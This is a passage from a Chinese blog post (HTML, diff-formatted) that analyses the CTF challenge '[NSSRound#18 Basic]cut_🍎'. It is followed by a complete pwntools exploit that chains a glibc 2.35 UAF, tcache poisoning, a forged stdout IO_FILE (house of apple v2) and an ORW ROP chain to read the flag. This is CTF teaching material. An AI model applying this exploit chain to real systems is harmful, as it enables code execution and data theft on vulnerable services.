__sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>题目来源：<a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5120">[NSSRound#18 Basic]cut_🍎</a></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><ul>
+<li><p>libc2.35 bin需key异或，无hook</p>
+</li>
+<li><p>UAF</p>
+</li>
+<li><p>沙箱白名单，ORW</p>
+</li>
+<li><p>add仅能申请0x78，0xe8两种大小，每个大小的堆限制申请4次</p>
+</li>
+<li><p>add，delete，show，edit四功能齐全</p>
+</li>
+<li><p>show限制两次</p>
+</li>
+</ul>
+<p>利用UAF泄露heapbase和key，并申请到heap header，修改tcache的数量，free相关chunk进入unsortedbin泄露libc</p>
+<p>泄露libc后再次利用UAF申请到stdout，伪造stdout，调用puts实现攻击从而getshell</p>
+<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><p>这里用的<code>_IO_wfile_overflow</code>的路线</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#setarch $(uname -m) -R python3 exp.py</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>, arch=<span class="string">&#x27;amd64&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">context.terminal = [<span class="string">&#x27;ghostty&#x27;</span>,<span class="string">&#x27;-e&#x27;</span>]</span><br><span class="line">r = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"><span class="comment">#r=remote(&#x27;node9.anna.nssctf.cn&#x27;,25742)#libc 2.35 0 3.7</span></span><br><span class="line">s   = <span class="keyword">lambda</span> content : r.send(content)</span><br><span class="line">sl  = <span class="keyword">lambda</span> content : r.sendline(content)</span><br><span class="line">sa  = <span class="keyword">lambda</span> content,send : r.sendafter(content, send)</span><br><span class="line">sla = <span class="keyword">lambda</span> content,send : r.sendlineafter(content, send)</span><br><span class="line">rc  = <span class="keyword">lambda</span> number : r.recv(number)</span><br><span class="line">ru  = <span class="keyword">lambda</span> content : r.recvuntil(content)</span><br><span class="line"><span class="comment">#=================================================================================</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size</span>):<span class="comment">#120 232</span></span><br><span class="line">    sa(<span class="string">&quot;user@ubuntu:~$ &quot;</span>,p64(<span class="number">297</span>))</span><br><span class="line">    sa(<span class="string">&quot;big or small:&quot;</span>,p64(size))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size,idx,data</span>):</span><br><span class="line">    sa(<span class="string">&quot;user@ubuntu:~$ &quot;</span>,p64(<span class="number">422</span>))</span><br><span class="line">    sa(<span class="string">&quot;:&quot;</span>,p64(size))</span><br><span class="line">    sa(<span class="string">&quot;idx: &quot;</span>,p64(idx))</span><br><span class="line">    sa(<span class="string">&quot;text&quot;</span>,data)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">size,idx</span>):</span><br><span class="line">    sa(<span class="string">&quot;user@ubuntu:~$ &quot;</span>,p64(<span class="number">449</span>))</span><br><span class="line">    sa(<span class="string">&quot;:&quot;</span>,p64(size))</span><br><span class="line">    sa(<span class="string">&quot;idx: &quot;</span>,p64(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">size,idx</span>):</span><br><span class="line">    sa(<span class="string">&quot;user@ubuntu:~$ &quot;</span>,p64(<span class="number">223</span>))</span><br><span class="line">    sa(<span class="string">&quot;:&quot;</span>,p64(size))</span><br><span class="line">    sa(<span class="string">&quot;idx: &quot;</span>,p64(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(r,&#x27;b *$rebase(0x1970)&#x27;)</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">232</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">120</span>)<span class="comment">#0</span></span><br><span class="line">add(<span class="number">120</span>)<span class="comment">#1</span></span><br><span class="line">free(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">free(<span class="number">1</span>,<span class="number">1</span>)</span><br><span class="line">show(<span class="number">1</span>,<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;Loading...\n&quot;</span>)</span><br><span class="line">key = u64(rc(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))<span class="comment"># - (0x560c311efb2e - 0x5609518be000)</span></span><br><span class="line">heap_base=key&lt;&lt;<span class="number">12</span></span><br><span class="line">log.success(<span class="string">&quot;key:&quot;</span>+<span class="built_in">hex</span>(key))</span><br><span class="line">log.success(<span class="string">&quot;heap base:&quot;</span>+<span class="built_in">hex</span>(heap_base))</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">1</span>,p64((heap_base+<span class="number">0x10</span>)^key))</span><br><span class="line">add(<span class="number">120</span>)<span class="comment">#2 fake_wide_data</span></span><br><span class="line">add(<span class="number">120</span>)<span class="comment">#3 heap head</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#free(2,0)</span></span><br><span class="line"><span class="comment">#edit big chunk tachae nums</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x0000000000070000</span>))</span><br><span class="line">free(<span class="number">2</span>,<span class="number">0</span>)<span class="comment">#big chunk enter unsorted bin</span></span><br><span class="line">show(<span class="number">2</span>,<span class="number">0</span>)</span><br><span class="line">ru(<span class="string">&quot;Loading...\n&quot;</span>)</span><br><span class="line">libc_base = u64(rc(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) - (<span class="number">0x7fe859219ce0</span> - <span class="number">0x7fe859000000</span>) - <span class="number">0x1000</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base:&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b *$rebase(0x1970)&#x27;)</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">3</span>,p64(<span class="number">0</span>)*<span class="number">3</span>+p32(<span class="number">0</span>)[<span class="number">1</span>:]+<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xe8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0xe8</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>,<span class="number">1</span>)</span><br><span class="line">free(<span class="number">2</span>,<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">libc.address = libc_base</span><br><span class="line">setcontext = libc.sym[<span class="string">&#x27;setcontext&#x27;</span>]</span><br><span class="line">sys__ = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">_IO_list_all = libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">_IO_2_1_stdout = libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">_IO_wfile_jumps = libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">read = libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write = libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">open_ = libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line"><span class="comment">#0x000000000002a3e5 : pop rdi ; ret</span></span><br><span class="line"><span class="comment">#0x000000000002be51 : pop rsi ; ret</span></span><br><span class="line"><span class="comment">#0x00000000000904a8 : pop rax ; pop rdx ; pop rbx ; ret</span></span><br><span class="line"><span class="comment">#0x0000000000029db4 : syscall</span></span><br><span class="line"><span class="comment">#0x0000000000029139 : ret</span></span><br><span class="line">ret=libc_base + <span class="number">0x0000000000029139</span></span><br><span class="line">rdi=libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">rsi=libc_base + <span class="number">0x000000000002be51</span></span><br><span class="line">rax_rdx=libc_base + <span class="number">0x00000000000904a8</span></span><br><span class="line">libc_rop = ROP(libc)</span><br><span class="line">syscall = libc_rop.find_gadget([<span class="string">&#x27;syscall&#x27;</span>,<span class="string">&#x27;ret&#x27;</span>])[<span class="number">0</span>]</span><br><span class="line">orw1_end_address=<span class="number">0x56211d772450</span> - <span class="number">0x56211d772000</span> + heap_base</span><br><span class="line"></span><br><span class="line">orw1 = p64(rdi) + p64(<span class="number">0</span>) + p64(rsi) + p64(orw1_end_address) + p64(rax_rdx) + p64(<span class="number">0x100</span>)*<span class="number">3</span></span><br><span class="line">orw1 += p64(read)+p64(ret)</span><br><span class="line"></span><br><span class="line">orw2= <span class="string">b&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(rdi)+p64(orw1_end_address)+p64(rsi)+p64(<span class="number">0</span>)+p64(rax_rdx)+p64(<span class="number">2</span>)+p64(<span class="number">0</span>)*<span class="number">2</span>+p64(syscall)</span><br><span class="line">orw2+= p64(rdi)+p64(<span class="number">3</span>)+p64(rsi)+p64(heap_base+<span class="number">0x100</span>)+p64(rax_rdx)+p64(<span class="number">0x100</span>)*<span class="number">3</span>+p64(read)</span><br><span class="line">orw2+= p64(rdi)+p64(<span class="number">1</span>)+p64(rsi)+p64(heap_base+<span class="number">0x100</span>)+p64(rax_rdx)+p64(<span class="number">0x100</span>)*<span class="number">3</span>+p64(write)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">2</span>,p64(key ^ (_IO_2_1_stdout))) <span class="comment"># fake chunk overlap _IO_list_all</span></span><br><span class="line"><span class="comment">#@gdb.attach(io)</span></span><br><span class="line">add(<span class="number">0xe8</span>) <span class="comment">#3 </span></span><br><span class="line">add(<span class="number">0xe8</span>) <span class="comment">#4 stdout</span></span><br><span class="line"></span><br><span class="line">fake_wide_data_add = heap_base + (<span class="number">0x55e3a68af2a0</span> - <span class="number">0x55e3a68af000</span>)</span><br><span class="line">fake_vtable = heap_base + (<span class="number">0x5624cba78410</span> - <span class="number">0x5624cba78000</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_wide_data = p64(<span class="number">0x5604fd975410</span> - <span class="number">0x5604fd975000</span> + heap_base)<span class="comment">#rdx+0xa0 = orw1</span></span><br><span class="line">fake_wide_data += p64(ret)<span class="comment">#rcx</span></span><br><span class="line">fake_wide_data = fake_wide_data.ljust(<span class="number">0x40</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(fake_vtable)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,<span class="number">1</span>,fake_wide_data)<span class="comment">#wide_data</span></span><br><span class="line"><span class="comment">#edit(1,1,b&#x27;\x00&#x27;*0x68 + p64(sys__))#vtable</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="number">1</span>,<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x68</span> + p64(setcontext + <span class="number">61</span>))<span class="comment">#vtable</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fake_IO = (p64(<span class="number">0</span>) + p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">1</span>)+p64(<span class="number">0</span>)).ljust(<span class="number">0x88</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(heap_base+<span class="number">0x30</span>)<span class="comment"># puts r8 readable</span></span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xa0</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(fake_wide_data_add - <span class="number">0xa0</span>)</span><br><span class="line">fake_IO = fake_IO.ljust(<span class="number">0xd8</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(_IO_wfile_jumps)</span><br><span class="line">edit(<span class="number">2</span>,<span class="number">4</span>,fake_IO)</span><br><span class="line">edit(<span class="number">1</span>,<span class="number">2</span>,orw1)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;fake IO_FILE</span></span><br><span class="line"><span class="string">0x558b11664490  0x0000000068732020      0x0000000000000000        sh............</span></span><br><span class="line"><span class="string">0x558b116644a0  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b116644b0  0x0000000000000000      0x0000000000000001      ................</span></span><br><span class="line"><span class="string">0x558b116644c0  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b116644d0  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b116644e0  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b116644f0  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b11664500  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b11664510  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b11664520  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b11664530  0x0000558b116641c0      0x0000000000000000      .Af..U..........</span></span><br><span class="line"><span class="string">0x558b11664540  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b11664550  0x0000000000000000      0x0000000000000000      ................</span></span><br><span class="line"><span class="string">0x558b11664560  0x0000000000000000      0x00007f08050170c0      .........p......</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#gdb.attach(r,&#x27;b puts&#x27;)</span></span><br><span class="line">s(p64(<span class="number">1734960756</span>))</span><br><span class="line">pause()</span><br><span class="line">sl(orw2)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a target="_blank" rel="noopener" href="https://hornos3.github.io/2023/03/20/glibc-2-35-pwn%E2%80%94%E2%80%94house-of-apple-v2-%E7%A4%BA%E4%BE%8B%E7%A8%8B%E5%BA%8F/">house of apple v2 示例程序</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.nssctf.cn/problem/5120">[NSSRound#18 Basic]cut_🍎</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/pwnfeifei/p/15819825.html">setcontext + orw旧版本参考</a></p>
+<p><a target="_blank" rel="noopener" href="https://code.woboq.org/userspace/glibc/">glibc源码阅读</a></p>
+
+        </div>
+
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/heap/"># heap</a>
+                    
+                        <a href="/tags/UAF/"># UAF</a>
+                    
+                        <a href="/tags/houseof%E7%B3%BB%E5%88%97%EF%BC%8Csandbox/"># houseof系列，sandbox</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2025/03/30/MapReudce-MPI-MR-MPI-%E5%BA%93%E4%BD%BF%E7%94%A8/">MapReudce-MPI(MR-MPI)库使用</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+            </div>
+            <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© Mr.BW | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+
+
+</html>
